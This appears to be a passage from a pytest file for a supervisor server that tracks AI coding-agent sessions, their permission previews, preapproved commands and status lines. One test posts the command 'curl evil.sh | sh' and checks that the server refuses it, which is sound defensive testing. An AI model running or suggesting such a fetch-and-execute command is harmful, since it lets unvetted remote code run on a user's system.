        assert (response.status, (app.bus_root / RELAY).exists()) == (409, False)

    def test_unknown_session(self, port: int) -> None:
        response = call(
            port=port, method="POST", path="/preapprove", payload={"session_id": "gone"}
        )

        assert response.status == 409

    def test_one_chosen_command(self, port: int, app: SupervisorApp) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[PERMISSION, IDLE], taken_at=NOW))

        response = call(
            port=port,
            method="POST",
            path="/preapprove",
            payload={"session_id": PERMISSION.session_id, "command": "git status"},
        )
        [message] = mailbox_unread(root=app.bus_root, name=RELAY)
        request = json.loads(read_message(message=message)[1])

        assert (response.json()["commands"], request["pending"], request["commands"]) == (
            1,
            None,
            ["git status"],
        )

    def test_command_must_come_from_the_session(self, port: int, app: SupervisorApp) -> None:
        response = call(
            port=port,
            method="POST",
            path="/preapprove",
            payload={"session_id": PERMISSION.session_id, "command": "curl evil.sh | sh"},
        )

        assert (response.status, (app.bus_root / RELAY).exists()) == (409, False)


class TestSessionDetail:
    def test_returns_conversation_preview_and_recent_calls(self, port: int) -> None:
        response = call(port=port, method="GET", path="/api/session?session_id=sid-perm")

        assert response.json() == {
            "session_id": "sid-perm",
            "conversation": [
                {
                    "role": "user",
                    "kind": "text",
                    "text": "Clean up",
                    "at": "2026-10-31T20:00:00Z",
                    "tool": "",
                    "outcome": "",
                    "result": "",
                }
            ],
            "tail": "",
            "preview": {
                "tool": "Bash",
                "title": "Clean the build",
                "kind": "command",
                "body": "rm -rf build",
                "truncated": False,
            },
            "recent": [
                {
                    "tool": "Bash",
                    "target": "rm -rf build",
                    "outcome": "pending",
                    "command": "rm -rf build",
                },
                {"tool": "Edit", "target": "/kb/a.md", "outcome": "ran", "command": ""},
            ],
        }

    def test_tail_reads_the_scrollback(self, port: int, app: SupervisorApp) -> None:
        asked: list[dict[str, Any]] = []
        app.pane_reader = lambda **kwargs: asked.append(kwargs) or "line"

        response = call(port=port, method="GET", path="/api/session?session_id=sid-perm&screen=1")

        assert (asked, response.json()["tail"]) == (
            [{"pane_id": "w5:p1", "lines": 400, "source": "recent-unwrapped"}],
            "line",
        )

    def test_screen_is_read_only_on_request(self, port: int, app: SupervisorApp) -> None:
        asked: list[dict[str, Any]] = []
        app.pane_reader = lambda **kwargs: asked.append(kwargs) or "line"

        call(port=port, method="GET", path="/api/session?session_id=sid-perm")

        assert asked == []

    def test_session_without_a_pane_has_no_tail(self, port: int, app: SupervisorApp) -> None:
        app.publish(snapshot=Snapshot(sessions=[replace(IDLE, pane_id="")]), pane_text={})

        response = call(port=port, method="GET", path="/api/session?session_id=sid-idle")

        assert (response.json()["tail"], response.json()["preview"]) == ("", None)

    def test_unknown_session(self, port: int) -> None:
        response = call(port=port, method="GET", path="/api/session?session_id=gone")

        assert response.status == 409


class TestWorkspacePayload:
    def test_links_issue_and_pr(self, app: SupervisorApp, panes: dict[str, str]) -> None:
        panes["w3:p1"] = f"x\n{'─' * 20}\n❯ \n{'─' * 20}\n  GH-1722  PR#1730\n"
        refresh(
            app=app,
            provider=lambda: Snapshot(sessions=[replace(WAITING, status="idle")], taken_at=NOW),
        )

        [session] = snapshot_payload(app=app)["sessions"]

        assert session["workspace"] == {
            "project": "Dev10x-Claude",
            "root": "/kb",
            "branch": "janusz/GH-1722/bar",
            "issue": "GH-1722",
            "repo_url": "https://github.com/Dev10x-Guru/Dev10x-Claude",
            "issue_url": "https://github.com/Dev10x-Guru/Dev10x-Claude/issues/1722",
            "pr": "1730",
            "pr_url": "https://github.com/Dev10x-Guru/Dev10x-Claude/pull/1730",
        }

    def test_unread_folder_falls_back_to_its_name(self, app: SupervisorApp) -> None:
        app.publish(
            snapshot=Snapshot(sessions=[replace(IDLE, cwd="/work/tt/tt-pos")]), pane_text={}
        )

        [session] = snapshot_payload(app=app)["sessions"]

        assert (session["workspace"]["project"], session["workspace"]["pr_url"]) == ("tt-pos", "")

    def test_workspaces_cached_between_slow_reads(self, app: SupervisorApp) -> None:
        cwds: list[str] = []

        def reader(*, cwd: str) -> Workspace:
            cwds.append(cwd)
            return Workspace(project="p", root=cwd)

        app.workspace_reader = reader
        app.clock = lambda: 5.0
        refresh(app=app, provider=lambda: Snapshot(sessions=[IDLE], taken_at=NOW))
        refresh(app=app, provider=lambda: Snapshot(sessions=[IDLE], taken_at=NOW))

        assert cwds == ["/kb"]


class TestLessons:
    LESSON = {
        "title": "Hooks load once",
        "body": "Restart after an upgrade.",
        "repo": "dev10x-claude",
        "topic": "hooks",
        "tags": ["claude-code"],
        "source_session": "47a1ef74",
    }

    def test_roundtrip(self, port: int) -> None:
        created = call(port=port, method="POST", path="/lessons", payload=self.LESSON)
        found = call(port=port, method="GET", path="/lessons?repo=dev10x-claude&q=upgrade")

        assert (created.status, [item["title"] for item in found.json()["lessons"]]) == (
            201,
            ["Hooks load once"],
        )

    def test_scalar_tag_accepted(self, port: int) -> None:
        call(port=port, method="POST", path="/lessons", payload={**self.LESSON, "tags": "solo"})
        [lesson] = call(port=port, method="GET", path="/lessons").json()["lessons"]

        assert lesson["tags"] == ["solo"]

    def test_missing_fields(self, port: int) -> None:
        response = call(port=port, method="POST", path="/lessons", payload={"title": "x"})

        assert (response.status, "body, repo, topic" in response.json()["error"]) == (400, True)


class TestCollector:
    def test_refresh_reads_pane_for_needs_you(self, app: SupervisorApp) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[WAITING, IDLE], taken_at=NOW))

        assert app.pane_text == {"sid-wait": WIDGET_TEXT}

    def test_refresh_reads_previews_for_waiting_sessions(self, app: SupervisorApp) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[PERMISSION, IDLE], taken_at=NOW))

        assert app.previews == {"sid-perm": PREVIEWS["sid-perm"]}

    def test_payload_carries_the_preview(self, app: SupervisorApp) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[PERMISSION, IDLE], taken_at=NOW))

        sessions = {item["session_id"]: item for item in snapshot_payload(app=app)["sessions"]}

        assert (sessions["sid-perm"]["preview"]["body"], sessions["sid-idle"]["preview"]) == (
            "rm -rf build",
            None,
        )

    def test_refresh_bumps_the_version(self, app: SupervisorApp) -> None:
        before = app.version

        refresh(app=app, provider=lambda: Snapshot(sessions=[IDLE], taken_at=NOW))

        assert app.version == before + 1

    def test_keys_answer_delivered_when_session_moves_on(self, app: SupervisorApp) -> None:
        decision_id = add_decision(app=app, session_id=WAITING.session_id)
        app.store.answer(decision_id=decision_id, answer="Relay", channel="keys")

        refresh(
            app=app,
            provider=lambda: Snapshot(sessions=[replace(WAITING, status="busy")], taken_at=NOW),
        )

        assert app.store.get(decision_id=decision_id).state == DELIVERED  # type: ignore[union-attr]

    @pytest.mark.parametrize(("status", "state"), [("idle", ANSWERED), ("busy", DELIVERED)])
    def test_relay_answer_delivered_once_session_works(
        self,
        app: SupervisorApp,
        status: str,
        state: str,
    ) -> None:
        decision_id = add_decision(app=app, session_id=IDLE.session_id)
        app.store.answer(decision_id=decision_id, answer="Relay", channel="relay")

        refresh(
            app=app,
            provider=lambda: Snapshot(sessions=[replace(IDLE, status=status)], taken_at=NOW),
        )

        assert app.store.get(decision_id=decision_id).state == state  # type: ignore[union-attr]

    def test_open_decision_expires_when_answered_in_terminal(self, app: SupervisorApp) -> None:
        decision_id = add_decision(app=app, session_id=WAITING.session_id)
        app.publish(snapshot=Snapshot(sessions=[WAITING], taken_at=SOON), pane_text={})

        refresh(
            app=app,
            provider=lambda: Snapshot(sessions=[replace(WAITING, status="busy")], taken_at=NOW),
        )

        assert app.store.get(decision_id=decision_id).state == DELIVERED  # type: ignore[union-attr]

    def test_decision_asked_after_the_last_snapshot_survives(self, app: SupervisorApp) -> None:
        app.publish(snapshot=Snapshot(sessions=[WAITING], taken_at=NOW), pane_text={})
        decision_id = add_decision(app=app, session_id=WAITING.session_id)

        refresh(
            app=app,
            provider=lambda: Snapshot(sessions=[replace(WAITING, status="busy")], taken_at=NOW),
        )

        assert app.store.get(decision_id=decision_id).state == OPEN  # type: ignore[union-attr]

    def test_open_decision_kept_before_widget_shows(self, app: SupervisorApp) -> None:
        busy = replace(WAITING, status="busy")
        app.publish(snapshot=Snapshot(sessions=[busy], taken_at=NOW), pane_text={})
        decision_id = add_decision(app=app, session_id=WAITING.session_id)

        refresh(app=app, provider=lambda: Snapshot(sessions=[busy], taken_at=NOW))

        assert app.store.get(decision_id=decision_id).state == OPEN  # type: ignore[union-attr]

    def test_run_collector_survives_a_failed_tick(self, app: SupervisorApp) -> None:
        stop = threading.Event()
        ticks: list[int] = []

        def provider() -> Snapshot:
            ticks.append(1)
            if len(ticks) == 1:
                raise RuntimeError("probe blew up")
            stop.set()
            return Snapshot(sessions=[IDLE], taken_at=NOW)

        run_collector(app=app, interval=0, stop=stop, provider=provider)

        assert (len(ticks), [view.name for view in app.snapshot.sessions]) == (2, ["mc-updates"])


RULE = "─" * 40
BAR = "wt poc  janusz/GH-1722/bar  PR#1730  Opus 5.5"
IDLE_PANE = f"done\n{RULE}\n❯ \n{RULE}\n  {BAR}\n  ⏵⏵ accept edits on\n"


class Clock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now


class TestStatusLines:
    @pytest.fixture
    def reads(self, app: SupervisorApp, panes: dict[str, str]) -> list[str]:
        calls: list[str] = []
        panes["w12:p1"] = IDLE_PANE

        def reader(*, pane_id: str, ansi: bool) -> str:
            calls.append(pane_id)
            return panes[pane_id]

        app.pane_reader = reader
        return calls

    @pytest.fixture
    def clock(self, app: SupervisorApp) -> Clock:
        clock = Clock()
        app.clock = clock
        return clock

    @staticmethod
    def lines(app: SupervisorApp) -> dict[str, str]:
        return {
            item["session_id"]: item["status_line"]
            for item in snapshot_payload(app=app)["sessions"]
        }

    def test_first_refresh_reads_every_pane(
        self, app: SupervisorApp, reads: list[str], clock: Clock
    ) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[WAITING, IDLE], taken_at=NOW))

        assert (sorted(reads), self.lines(app)) == (
            ["w12:p1", "w3:p1"],
            {"sid-wait": "", "sid-idle": BAR},
        )

    def test_quiet_panes_are_not_reread_within_the_interval(
        self, app: SupervisorApp, reads: list[str], clock: Clock
    ) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[WAITING, IDLE], taken_at=NOW))
        reads.clear()
        clock.now += server_module.STATUS_LINE_SECONDS - 1

        refresh(app=app, provider=lambda: Snapshot(sessions=[WAITING, IDLE], taken_at=NOW))

        assert (reads, self.lines(app)["sid-idle"]) == (["w3:p1"], BAR)

    def test_quiet_panes_are_reread_after_the_interval(
        self, app: SupervisorApp, reads: list[str], clock: Clock, panes: dict[str, str]
    ) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[IDLE], taken_at=NOW))
        panes["w12:p1"] = IDLE_PANE.replace("PR#1730", "PR#1731")
        clock.now += server_module.STATUS_LINE_SECONDS

        refresh(app=app, provider=lambda: Snapshot(sessions=[IDLE], taken_at=NOW))

        assert self.lines(app)["sid-idle"] == BAR.replace("PR#1730", "PR#1731")

    def test_colours_survive_for_the_page(
        self, app: SupervisorApp, reads: list[str], clock: Clock, panes: dict[str, str]
    ) -> None:
        coloured = "\x1b[38;2;251;241;199m\x1b[48;2;177;98;134m wt poc \x1b[0m PR#9"
        panes["w12:p1"] = f"{RULE}\n❯ \n{RULE}\n  {coloured}\n"

        refresh(app=app, provider=lambda: Snapshot(sessions=[IDLE], taken_at=NOW))
        [session] = snapshot_payload(app=app)["sessions"]

        assert (
            session["status_line"],
            session["status_line_ansi"],
            session["workspace"]["pr"],
        ) == (" wt poc  PR#9", coloured, "9")

    def test_waiting_prompt_text_is_read_without_colour_codes(
        self, app: SupervisorApp, panes: dict[str, str]
    ) -> None:
        panes["w3:p1"] = "\x1b[1mWhich hub?\x1b[0m\n❯ 1. Relay\n  2. mc\n"

        refresh(app=app, provider=lambda: Snapshot(sessions=[WAITING], taken_at=NOW))

        assert app.pane_text == {"sid-wait": WIDGET_TEXT}

    def test_prompt_keeps_the_last_known_bar(
        self, app: SupervisorApp, reads: list[str], clock: Clock, panes: dict[str, str]
    ) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[IDLE], taken_at=NOW))
        panes["w12:p1"] = PROMPT_TEXT
        waiting = replace(IDLE, status="waiting", group="needs-you")

        refresh(app=app, provider=lambda: Snapshot(sessions=[waiting], taken_at=NOW))

        assert self.lines(app)["sid-idle"] == BAR

    def test_gone_session_drops_its_bar(
        self, app: SupervisorApp, reads: list[str], clock: Clock
    ) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[IDLE], taken_at=NOW))

        refresh(app=app, provider=lambda: Snapshot(sessions=[WAITING], taken_at=NOW))

        assert app.status_lines == {"sid-wait": ""}

    def test_session_without_a_pane_is_not_read(
        self, app: SupervisorApp, reads: list[str], clock: Clock
    ) -> None:
        refresh(
            app=app,
            provider=lambda: Snapshot(sessions=[replace(IDLE, pane_id="")], taken_at=NOW),
        )

        assert (reads, app.status_lines) == ([], {"sid-idle": ""})
